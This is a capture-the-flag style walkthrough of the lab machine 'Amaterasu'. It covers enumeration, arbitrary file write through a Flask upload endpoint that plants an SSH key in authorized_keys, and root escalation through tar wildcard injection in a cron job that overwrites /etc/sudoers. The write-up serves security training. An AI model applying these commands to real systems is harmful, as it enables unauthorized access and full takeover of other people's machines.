---
type: Lab-Machine
Status: 🟢
OS: Linux
Difficulty: Easy
IP: 192.168.144.249
Date: 2026-06-01T00:13:00
Owned: 2026-06-01T11:00:00
---

# 🖥️ Machine: [[Amaterasu]]
**List Source:** #Lainkusanagi | #TJnull 
**Target IP:** 192.168.144.249

---
# Enumeration
## port scan
```sh
 naabu -host 192.168.144.249 -p - | nerva -o allport.txt
```
![[Pasted image 20260601002308.png]]
normal service but obscure port huh let's check out
33414
![[Pasted image 20260601002406.png]]
tech stack
![[Pasted image 20260601005119.png]]
using searchsploit can't find exploit for apache http server 2.4.53
40080
![[Pasted image 20260601002500.png]]

## dir enum
```
feroxbuster -u http://192.168.144.249:33414 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -o ferox33414.txt
```
found one
![[Pasted image 20260601002759.png]]
/info show that there is /help
/help show that we can upload using POST and get the file with GET 
![[Pasted image 20260601002739.png]]
let's check out file
![[Pasted image 20260601002939.png]]
we can see what file are present in /tmp
can we change dir?
indeed we can
![[Pasted image 20260601003024.png]]
we can see what file are there but can't read the file
![[Pasted image 20260601003116.png]]

40080
![[Pasted image 20260601003910.png]]
nothing interesting


# Exploit
let's use the file upload function
![[Pasted image 20260601005831.png]]
use burp to change to POST
![[Pasted image 20260601005916.png]]
got error message
upon searching this is error of flask
let's see how do we upload a file
reference
https://everything.curl.dev/http/post/multipart.html
```sh
curl -F "file=@test.txt" http://192.168.144.249:33414/file-upload
```
![[Pasted image 20260601012210.png]]
add filename
![[Pasted image 20260601012304.png]]
ok let's check if file is uploaded
![[Pasted image 20260601012348.png]]
yes!

we can see that there is .ssh of user alfredo if we replace id_rsa.pub then we could ssh
![[Pasted image 20260601012647.png]]
first let's try upload to this folder, changing filename path
```
curl -F "file=@test.txt" -F "filename=/home/alfredo.ssh/test.txt" http://192.168.144.249:33414/file-upload
```
![[Pasted image 20260601012900.png]]
not work
maybe we need to navigate the path from /tmp since it is the default upload path
nah I missed / before .ssh
![[Pasted image 20260601013048.png]]
we can just upload to the path
## ssh key
generate our new key
```
ssh-keygen -t rsa
```
![[Pasted image 20260601012538.png]]
to upload testkey.pub to the target
```sh
curl -F "file=@testkey.pub" -F "filename=/home/alfredo/.ssh/id_rsa.pub" http://192.168.144.249:33414/file-upload
```
![[Pasted image 20260601013245.png]]
need to bypass the file permission
maybe if we told the server that file is text
let's see how we add header in curl
![[Pasted image 20260601013343.png]]
using the same site ref
let's try `-H 'Content-Type: text/plain'`
```sh
curl -F "file=@testkey.pub" -F "filename=/home/alfredo/.ssh/id_rsa.pub" -H 'Content-Type: text/plain' http://192.168.144.249:33414/file-upload
```
not work it's say no file part again
![[Pasted image 20260601014027.png]]
imma just cp the testkey.pub as testkey.txt then upload
success!
![[Pasted image 20260601014058.png]]
```sh
ssh -i testkey -p25022 alfredo@192.168.144.249
```
it still prompt for password
ok i need to upload it to /.ssh/authorized_keys
```sh
curl -F "file=@testkey.txt" -F "filename=/home/alfredo/.ssh/authorized_keys" http://192.168.144.249:33414/file-upload
```
done
![[Pasted image 20260601015223.png]]
![[Pasted image 20260601015331.png]]
# Privilege Escalation
check os
```
cat /etc/os-release
```
![[Pasted image 20260601021245.png]]
no exploit for fedora 34
![[Pasted image 20260601021208.png]]

```sh
find / -perm -u=s -type f 2>/dev/null
```

![[Pasted image 20260601020030.png]]

bruh let's try the script
```
scp -i testkey -P 25022 /usr/share/unix-privesc-check/unix-privesc-check alfredo@192.168.144.249:/home/alfredo
```
![[Pasted image 20260601022259.png]]

```
./unix-privesc-check standard
```
only found 'WARNING' for the keys we uploaded
![[Pasted image 20260601022458.png]]
now try linux smart enum
https://github.com/diego-treitos/linux-smart-enumeration/tree/master


cronjob
```
cat /etc/crontab
```
![[Pasted image 20260601024501.png]]

## linpeas
![[Pasted image 20260601095508.png]]
the script
![[Pasted image 20260601101218.png]]
there is *
tar czf is use to create a .tar archive 
in this script it create archive of all files in /tmp
![[Pasted image 20260601101559.png]]
we can try to get tar to spawn shell as in command
let's try create file name `--checkpoint=1` and `--checkpoint-action=exec=/bin/sh`

idk cant create file with forward slash `/` in the name

instead of creating the file name with /bin/sh we create a .sh to get sudoers instead
create the file
```
vi test.sh
#file content
echo 'alfredo ALL=(root) NOPASSWD: ALL' > /etc/sudoers
#save quit
:wq!
```
now create file named `--checkpoint-action=exec=sh test.sh`
```
echo "" > '--checkpoint-action=1'
echo "" > '--checkpoint-action=exec=sh test.sh'
```

don't forget we need to create in /restapi
![[Pasted image 20260601103652.png]]
didn't work maybe script can't run test.sh even run with root permission but execute bit was not set
![[Pasted image 20260601105333.png]]
```
chmod +x test.sh
```
i was right
![[Pasted image 20260601105400.png]]
```
sudo su
```
![[Pasted image 20260601105531.png]]

![[Pasted image 20260601105648.png]]
